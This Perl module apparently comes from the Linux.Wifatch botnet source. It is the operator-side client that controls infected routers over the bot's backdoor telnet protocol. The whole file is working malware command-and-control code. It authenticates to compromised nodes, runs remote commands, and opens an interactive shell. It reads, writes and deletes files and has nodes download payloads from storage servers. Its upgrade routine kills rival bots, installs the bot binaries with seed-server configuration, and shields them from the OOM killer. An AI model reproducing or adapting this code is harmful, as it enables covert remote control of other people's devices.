#
# This file is part of Linux.Wifatch
#
# Copyright (c) 2013,2014,2015 The White Team <rav7teif@ya.ru>
#
# Linux.Wifatch is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Linux.Wifatch is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Linux.Wifatch. If not, see <http://www.gnu.org/licenses/>.
#

package bm::tn;

# for port 0x2222 testing
# ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccoemcbodfiafgjeodnnlbabeoejgllhnofbfcddalbcjgdgcanceenkejfmkakbkpcccc

use strict;

use Errno ();
use Coro;
use Carp ();
use PApp::SQL;
use Digest::SHA3;    # actually needs to be keccak, not sha3
use Scalar::Util ();
use CBOR::XS     ();
use MIME::Base64 ();

use bn::io;

use bm::socks;
use bm::sql;
use bm::crypto;
use bm::meta;
use bm::file;

my $KEY_ID    = pack "H*", "not-the-real-secret";
my $KEY_FIXED = pack "H*", "not-the-real-secret";
my $KEY_NODE  = pack "H*", "not-the-real-secret";
my $KEY_TYPE  = pack "H*", "not-the-real-secret";

sub gencreds(;$)
{
	my ($type) = @_;

	my $id0 = bm::crypto::randbytes 32;
	my $c;

	while () {
		my $id = $id0 ^ pack "N", $c;

		if ($type == ord Digest::SHA3::sha3_256 $id . $KEY_TYPE) {
			my $secret = $id;

			$secret = Digest::SHA3::sha3_256 $secret . $KEY_FIXED;
			$secret = Digest::SHA3::sha3_256 $KEY_FIXED . $secret;

			return ($id, $secret);
		}

		++$c;
	}
}

sub format_credarg($$$)
{
	my ($id, $secret, $port) = @_;

	my $arg = unpack "H*", pack "a32 a32 n", $id, $secret, $port;
	$arg =~ y/0-9a-f/a-q/;

	$arg
}

sub new
{
	my ($class, $host, $port) = @_;

	if ($host =~ /^[a-z]/) {
		$host = bm::sql::getenv $host;
		$host =~ s/:\d+$//;
	}

	for my $p ($port ? $port : @bm::meta::TNPORTS) {
		my $tn = $class->_new($host, $p);
		return $tn if $tn;
	}

	();
}

sub _new
{
	my ($class, $host, $port) = @_;

	my $fh = bm::socks::connect $host, $port
		or return;

	my $self = bless {
		host => $host,
		port => $port,
		name => "$host:$port",
		fh   => $fh,
		rq   => (new Coro::Channel),
		wl   => (new Coro::Semaphore),
		ol   => (new Coro::Semaphore),
	}, $class;

	($self->{chg}) = bn::io::xread $fh, 32 or return;
	($self->{id})  = bn::io::xread $fh, 32 or return;

	$self->clear;

	{
		my ($key, $secret);

		if (defined(my $secret1 = sql_fetch "select secret1 from node where id = ?", $self->{id})) {
			$key    = $KEY_NODE;
			$secret = $secret1;
		} else {
			$key    = $KEY_FIXED;
			$secret = $self->{id};
		}

		$secret = Digest::SHA3::sha3_256 $secret . $key;
		$secret = Digest::SHA3::sha3_256 $key . $secret;

		bn::io::xwrite $fh, pack "C/a", Digest::SHA3::sha3_256 "$self->{chg}$self->{id}$secret";
	}

	($self->{version}, $self->{arch}) = split /\//, $self->rpkt;
	$self->{endian} = $self->rpkt eq "\x11\x22\x33\x44" ? ">" : "<";

	return undef unless length $self->{arch};
	return undef unless length $self->{version};

	# now wl valid

	while (length(my $env = $self->rpkt)) {

		# unused
	}

	{
		Scalar::Util::weaken(my $self = $self);

		$self->{wcb} = sub {
			my $len = syswrite $fh, $self->{wbuf};
			substr $self->{wbuf}, 0, $len, "";
			undef $self->{ww} unless length $self->{wbuf};

			if (!defined $len && $! != Errno::EAGAIN) {
				$self->DESTROY;
			}
		};

		$self->{coro} = async {
			while (my $cb = $self->{rq}->get) {
				$cb->($self);
			}
		};
	}

	$self->read_file_(
		"/proc/self/stat",
		sub {
			if ($_[0] =~ /^\d+ \(.*?\) . (\d+)/) {
				my $ppid = $1;

				async_pool {
					$self->write_file("/proc/$ppid/oom_adj",       "-17");
					$self->write_file("/proc/$ppid/oom_score_adj", "-1000");
				};
			}
		});

	$self->write_file("/proc/self/oom_adj",       "0");
	$self->write_file("/proc/self/oom_score_adj", "0");

	$self
}

sub DESTROY
{
	my ($self) = @_;

	$self->{coro}->cancel;
	%$self = ();
}

sub clear
{
	my $self = shift;

	if (@_) {
		delete $self->{cache}{$_} for @_;
	} else {
		$self->{cache} = {};
		$self->{clock} = new Coro::SemaphoreSet;
	}
}

sub _cache
{
	my ($self, $type, $path, $cb) = @_;

	my $guard = $self->{clock}->guard("$type/$path");

	if (my $cache = $self->{cache}{$path}{$type}) {
		$cb->(@$cache);
		return;
	} else {
		sub {
			$self->{cache}{$path}{$type} = [@_];
			undef $guard;
			&$cb
			}
	}
}

sub pack
{
	my ($self, $pack, @args) = @_;

	$pack =~ s/([sSlL])/$1$self->{endian}/g;

	pack $pack, @args;
}

sub rpkt
{
	my ($self) = @_;

	my ($l) = bn::io::xread $self->{fh}, 1;

	$l = ord $l;

	my ($buf) = bn::io::xread $self->{fh}, $l
		or ((warn "$self->{name} unexpected eof\n"), return);

	$self->{rcv} += $l + 1;

	$buf
}

sub _send
{
	$_[0]{snt} += length $_[1];

	$_[0]{wbuf} .= $_[1];
	$_[0]{ww} ||= AE::io $_[0]{fh}, 1, $_[0]{wcb};
}

sub wpkt
{
	my ($self, $data) = @_;

	Carp::confess "$self->{name} packet too long (" . (unpack "H*", $data) . ")"
		if 254 < length $data;

	$_[0]->_send(pack "C/a", $data);
}

sub wpack
{
	my ($self, $pack, @args) = @_;

	$self->wpkt($self->pack($pack, @args));
}

sub shell
{
	my ($self) = @_;

	$self->{wl}->down;
	$self->wpkt(chr 1);

	$self->{rq}->put(my $rcb = Coro::rouse_cb);
	Coro::rouse_wait $rcb;

	$self->{coro}->cancel;

	delete $self->{fh};
}

sub telnet
{
	my $fh = $_[0]->shell;

	my $rr = AE::io $fh, 0, sub {
		sysread $fh, my $buf, 1024
			or exit 0;

		syswrite STDOUT, $buf;
	};

	while () {
		Coro::AnyEvent::readable * STDIN;
		sysread *STDIN, my $buf, 1024;
		bn::io::xwrite $fh, $buf;
	}
}

####################################################################################
# make sure everything is executed
sub flush_
{
	my ($self, $cb) = @_;

	$self->ret_($cb);
}

sub unlink
{
	my ($self, $path) = @_;

	my $guard = $self->{wl}->guard;
	delete $self->{cache}{$path};
	$self->wpkt((chr 8) . $path);
}

sub chdir
{
	my ($self, $path) = @_;

	my $guard = $self->{wl}->guard;
	$self->wpkt((chr 22) . $path);
}

sub mkdir
{
	my ($self, $path) = @_;
	my $guard = $self->{wl}->guard;
	delete $self->{cache}{$path};
	$self->wpkt((chr 9) . $path);
}

# does NOT clear
sub kill
{
	my ($self, $signal, @pids) = @_;
	my $guard = $self->{wl}->guard;
	$self->wpack("CC xx L", 5, $signal, $_) for @pids;
}

sub chmod
{
	my ($self, $mode, $path) = @_;
	my $guard = $self->{wl}->guard;
	delete $self->{cache}{$path}{stat};
	$self->wpack("C x S a*", 6, $mode, $path);
}

sub rename
{
	my ($self, $src, $dst) = @_;
	my $guard = $self->{wl}->guard;
	$self->{cache}{$dst} = delete $self->{cache}{$src};
	$self->wpkt((chr 7) . $src);
	$self->wpkt($dst);
}

sub close
{
	my ($self) = @_;
	my $guard = $self->{wl}->guard;
	$self->wpkt(chr 4) if $self->{ol}->count <= 0;

	delete $self->{cache}{ $self->{opath} } if $self->{omode};
	delete $self->{opath};
	delete $self->{omode};
	$self->{ol}->up;
}

sub open
{
	my ($self, $path, $write) = @_;

	$self->{ol}->down;
	$self->{opath} = $path;
	$self->{omode} = $write;

	my $guard = $self->{wl}->guard;
	$self->wpack("Ca*", $write ? 3 : 2, $path);
}

sub lseek
{
	my ($self, $off, $mode) = @_;
	my $guard = $self->{wl}->guard;
	$self->wpack("C x2 C l", 16, $mode, $off);
}

sub readall_
{
	my ($self, $cb) = @_;

	my $guard = $self->{wl}->guard;
	$self->wpkt(chr 18);

	$self->{rq}->put(
		sub {
			my @data;

			while (length(my $buf = $self->rpkt)) {
				push @data, $buf;
			}

			$cb->(join "", @data);
		});
}

sub read_file_
{
	my ($self, $path, $cb) = @_;

	if (my $cb = $self->_cache(data => $path, $cb)) {
		$self->open($path);
		$self->readall_($cb);
		$self->close;
	}
}

sub write
{
	my ($self, $data) = @_;

	my $guard = $self->{wl}->guard;
	for (my $o = 0; $o < length $data; $o += 253) {
		$self->wpkt((chr 19) . substr $data, $o, 253);
	}
}

sub write_file
{
	my ($self, $path, $data) = @_;

	$self->open($path, 1);
	delete $self->{cache}{$path};
	$self->write($data);
	$self->close;

	1
}

sub xstat_
{
	my ($self, $mode, $path, $cb) = @_;

	if ($cb = $self->_cache(stat => $path, $cb)) {
		my $guard = $self->{wl}->guard;
		$self->wpkt((chr $mode) . $path);
		$self->{rq}->put(
			sub {
				my ($dev, $ino, $mode, $size, $mtime) = unpack "L$self->{endian}*", $self->rpkt;
				$cb->([$dev, $ino, $mode, 1, 0, 0, undef, $size, $mtime, $mtime, $mtime, undef, undef]);
			});
	}
}

sub lstat_
{
	my ($self, $path, $cb) = @_;

	$self->xstat_(11, $path, $cb);
}

sub stat_
{
	my ($self, $path, $cb) = @_;

	$self->xstat_(23, $path, $cb);
}

sub statfs_
{
	my ($self, $path, $cb) = @_;

	if ($cb = $self->_cache(statfs => $path, $cb)) {
		my $guard = $self->{wl}->guard;
		$self->wpkt((chr 12) . $path);
		$self->{rq}->put(
			sub {
				my %info;
				@info{qw(type bsize blocks bfree bavail files free)} = unpack "L$self->{endian}*", $self->rpkt;
				$cb->(\%info);
			});
	}
}

sub readlink_
{
	my ($self, $path, $cb) = @_;

	if ($cb = $self->_cache(link => $path, $cb)) {
		my $guard = $self->{wl}->guard;
		$self->wpkt((chr 20) . $path);
		$self->{rq}->put(
			sub {
				$cb->($self->rpkt);
			});
	}
}

sub getdents_
{
	my ($self, $cb) = @_;

	my $guard = $self->{wl}->guard;
	$self->wpkt(chr 15);
	$self->{rq}->put(
		sub {
			my $buf = do {
				my @buf;

				while (length(my $buf = $self->rpkt)) {
					push @buf, $buf;
				}

				join "", @buf;
			};

			my @names;

			for (my $o = 0; $o < length $buf;) {
				my ($ino, $off, $reclen, $type, $name) =
					unpack "Q$self->{endian} q$self->{endian} S$self->{endian} C Z*",
					substr $buf, $o;

				if ($reclen == 0) {
					warn "$self->{name} reclen zero, aborting getdents.\n";
					return $cb->();
				}

				push @names, [$ino, $type, $name]
					if $name !~ /^(\.|\.\.)$/;

				$o += $reclen;
			}

			$cb->(\@names);
		});
}

sub readdir_
{
	my ($self, $path, $cb) = @_;

	if ($cb = $self->_cache(ls => $path, $cb)) {
		$self->open($path);
		$self->getdents_($cb);
		$self->close;
	}
}

sub ls_
{
	my ($self, $path, $cb) = @_;

	$self->readdir_(
		$path,
		sub {
			$cb->([map $_->[2], @{ $_[0] }]);
		});
}

sub fnv32a_
{
	my ($self, $cb) = @_;

	my $guard = $self->{wl}->guard;
	$self->wpkt(chr 17);
	$self->{rq}->put(
		sub {
			$cb->(unpack "L$self->{endian}", $self->rpkt);
		});
}

sub fnv_
{
	my ($self, $path, $cb) = @_;

	if ($cb = $self->_cache(fnv => $path, $cb)) {
		$self->open($path);
		$self->fnv32a_($cb);
		$self->close;
	}
}

sub ret_
{
	my ($self, $cb) = @_;

	my $guard = $self->{wl}->guard;
	$self->wpkt(chr 21);
	$self->{rq}->put(
		sub {
			$cb->(unpack "l$self->{endian}", $self->rpkt);
		});
}

sub system
{
	my ($self, $cmd) = @_;

	my $guard = $self->{wl}->guard;
	$self->wpkt((chr 13) . $cmd);
}

sub rsh_
{
	my ($self, $cmd, $cb) = @_;

	my $guard = $self->{wl}->guard;
	$self->wpkt((chr 14) . $cmd);

	$self->{rq}->put(
		sub {
			my $end = pack "C/a", $self->{chg} . $self->{id};

			my $buf = bn::io::xread $self->{fh}, length $end;

			until ($end eq substr $buf, -length $end) {
				my ($buf2) = bn::io::xread $self->{fh}, 1
					or return $cb->();

				$buf .= $buf2;
			}

			undef $guard;
			cede;
			$cb->(substr $buf, 0, -length $end);
		});
}

####################################################################################
sub send_file_
{
	my ($self, $file, $dst, $cb) = @_;

	$self->unlink("${dst}w");
	$self->unlink("${dst}x");

	$self->fnv_(
		$dst,
		sub {
			if ($file->{fnv} eq $_[0]) {
				$self->chmod($file->{perm}, $dst);
				$cb->(1);
			} else {
				my $dstx = $dst . "x";

				$self->unlink($dst);    # save memory on low-memory node
				$self->open($dstx, 1);
				$self->write($file->{data});
				$self->close;

				$self->fnv_(
					$dstx,
					sub {
						if ($file->{fnv} eq $_[0]) {
							$self->chmod($file->{perm}, $dstx);
							$self->rename($dstx, $dst);
							$cb->(1);

						} else {
							$self->unlink($dstx);
							$cb->(0);
						}
					});
			}
		});
}

sub dl_
{
	my ($self, $node, $type, $id, $dst, $cb) = @_;

	$self->open($dst, 1);

	my ($host, $port) = split /:/, $node;
	$host = Socket::inet_aton $host;

	{
		my $guard = $self->{wl}->guard;
		$self->wpack("C x n a4", 10, $port, $host);

		# write data always < 254!?
		$self->wpkt("OhKa8eel" . pack "C/a", pack "Ca*", $type + 64, $id);
		$self->wpkt("");
		$self->wpkt((chr 20) . ".");    # readlink, fails with 0 byte reply
		$self->wpkt(chr 21);            # returns result

		$self->{rq}->put(
			sub {
				my ($len, $buf);

				while (length($buf = $self->rpkt)) {
					$len += unpack "L$self->{endian}", $buf;
				}

				$cb->((unpack "L$self->{endian}", $self->rpkt), $len);
			});
	}

	$self->close;
}

sub dl_file_
{
	my ($self, $file, $dst, $cb) = @_;

	$self->unlink("${dst}w");
	$self->unlink("${dst}x");

	$self->fnv_(
		$dst,
		sub {
			if ($file->{fnv} eq $_[0]) {
				$self->chmod($file->{perm}, $dst);
				$cb->(1);
			} else {
				my $dstx = $dst . "x";

				$self->unlink($dst);    # save memory on low-memory node

				async_pool {
					for my $server (bm::sql::storage_servers) {
						$self->dl_($server, 3, $file->{sha}, $dstx, sub { });

						my $success;

						$self->fnv_($dstx, my $rcb = Coro::rouse_cb);

						if ($file->{fnv} eq Coro::rouse_wait $rcb) {
							$self->chmod($file->{perm}, $dstx);
							$self->rename($dstx, $dst);
							return $cb->(1);

						} else {
							$self->unlink($dstx);
						}
					}

					$self->unlink($dstx);
					$cb->(0);
				};
			}
		});
}

*ping_ = \&ret_;

sub sync_
{
	my ($self, $cb) = @_;

	$self->{rq}->put($cb);
}

####################################################################################
sub pids_
{
	my ($self, $cb) = @_;

	$self->ls_(
		"/proc",
		sub {
			$cb->(grep /^\d+$/a, @{ $_[0] });
		});
}

sub tail_
{
	my ($self, $path, $bytes, $cb) = @_;

	if ($cb = $self->_cache("tail/$bytes", $path, $cb)) {
		$self->open($path);
		$self->lseek(-$bytes, 2);
		$self->readall_($cb);
		$self->close;
	}
}

# filter($pid,$version,$arch,$name)
sub bnfind_
{
	my ($self, $filter, $cb) = @_;

	$self->pids_(
		sub {
			my @pids;

			for my $pid (@_) {
				$self->tail_(
					"/proc/$pid/exe",
					64,
					sub {
						if ($_[0] =~ /\nZieH8yie Zip0miib (\d+) (\S+) (\S+)[^\n]*\n\Z/) {
							push @pids, $pid
								if $filter->($pid, $1, $2, $3);
						}
					});
			}

			$self->sync_(
				sub {
					$cb->(@pids);
				});
		});
}

# uses too much bandwidth to be of use
sub portinfo_
{
	my ($self, $cb) = @_;

	my %tcp;
	my %fd;

	my $cv = AE::cv {
		$cb->();
	};

	$cv->begin;
	$self->read_file_(
		"/proc/net/tcp",
		sub {
			for (split /\n/, $_[0]) {
				s/^ +//;
				my ($idx, $loc, $rem, $st, $tx, $rx, $tr, $retrnsmt, $uid, $timeout, $inode) = split /\s+/;

				next unless $rem eq "00000000:0000";

				warn "$loc $inode\n";
			}

			$cv->end;
		});

	$cv->begin;
	$self->pids_(
		sub {
			for my $pid (@_) {
				$cv->begin;
				$self->readdir_(
					"/proc/$pid/fd",
					sub {
						for my $dent (@{ $_[0] }) {
							if (0) {
								$cv->begin;
								$self->readlink_(
									"/proc/$pid/fd/$dent->[2]",
									sub {
										warn "$pid $dent->[2] <$_[0]>\n";

										# "socket:[12345]" type 1
										# "[0000]:12345" # type 2
										$cv->end;
									});
							}
						}
						$cv->end;
					});
			}

			$cv->end;
		});
}

sub lair_
{
	my ($self, $cb) = @_;

	$self->readlink_(
		"/proc/self/exe",
		sub {
			my ($lair) = @_;

			$lair =~ s/ \(deleted\)$//;
			$lair =~ s/\x00.*//s;
			$lair =~ s/\/\.net_tn$//
				or return $cb->();

			$cb->($lair);
		});
}

sub load_pl
{
	bm::file::load "dist/pl";
}

sub load_bn
{
	bm::file::load "arch/$_[0]{arch}/botnet";
}

sub read_cfg_
{
	my ($self, $cb) = @_;

	my $lair = $self->lair;

	$self->read_file_(
		"$lair/.net_cf",
		sub {
			my $bin = shift;
			my $cfg = eval {
				$bin =~ s/\n[\x20-\x7e]+\n$//;
				CBOR::XS::decode_cbor Compress::LZF::decompress $bin;
			};
			$cb->($cfg);
		});
}

sub write_cfg_
{
	my ($self, $cfg, $cb) = @_;

	my $lair = $self->lair;

	$cfg = CBOR::XS::encode_cbor $cfg;
	$cfg = Compress::LZF::compress $cfg;
	$cfg .= "\nZieH8yie Zip0miib 0 - cf\n";

	$self->write_file("$lair/.net_cfx", $cfg);
	$self->rename("$lair/.net_cfx", "$lair/.net_cf");

	$cb->(1);
}

sub upgrade
{
	my ($self) = @_;

	$self->lstat_(
		"/dev/null",
		sub {
			return if defined $_[0][0];
			$self->system("mknod /dev/null c 1 3");
		});

	# some routers fill all their ram with logfiles
	if (0) {
		for my $bigfile (qw(
			/var/dnsproxy
			)
			) {
			$self->stat_(
				$bigfile,
				sub {
					$self->system("true >\Q$bigfile\E", sub { });
				});
		}
	}

	$self->bnfind_(sub {$_[3] eq "botnet"}, my $rcb = Coro::rouse_cb);
	$self->kill(9, Coro::rouse_wait $rcb);

	my $lair = $self->lair;

	#	$self->system ("killall -9 telnetd utelnetd");

	my $bn = $self->load_bn;
	$self->dl_file($bn, "$lair/.net_bn")
		or die "$self->{name} unable to dl bn\n";

	my $pl = $self->load_pl;
	$self->dl_file($pl, "$lair/.net_pl");
	unless ($self->dl_file($pl, "$lair/.net_pl")) {
		warn "$self->{name} unable to dl pl\n";
		$self->write_file("$lair/.net_pl", $pl->{data})
			or die "$self->{name} unable to send pl\n";
	}

	my $cfg = $self->read_cfg;
	$cfg->{infect} = int AE::now;
	$cfg->{tnport} = $self->{port};
	push @{ $cfg->{hpvs4} }, map bm::meta::str2id $_, bm::sql::seed_servers;
	delete $cfg->{seed};
	$self->write_cfg($cfg);

	#	$self->system ("\Q$lair\E/.net_bn cset " . MIME::Base64::encode_base64 ((CBOR::XS::encode_cbor {
	#		infect => int AE::now,
	#		tnport => $self->{port},
	#	})));

	#my $res =
	$self->system("\Q$lair\E/.net_bn -start");

	#	$res =~ /^jo0iiPh1<\d+>/
	#		or die "$self->{name} unable to start node ($res)\n";

	Coro::AnyEvent::sleep 5;

	#	$self->system ("killall -STOP telnetd utelnetd");
}

####################################################################################
our $AUTOLOAD;

AUTOLOAD {
	$AUTOLOAD =~ /([^:]+)$/
		or die "autoload failure: $AUTOLOAD";

	my $fn = $1;

	if ($fn =~ s/_$//) {
		die "$AUTOLOAD not available\n";
	} else {
		$fn .= "_";
		*$AUTOLOAD = sub {
			push @_, my $rcb = Coro::rouse_cb;
			&$fn;
			Coro::rouse_wait $rcb;
		};
	}

	goto &$AUTOLOAD;
}

1

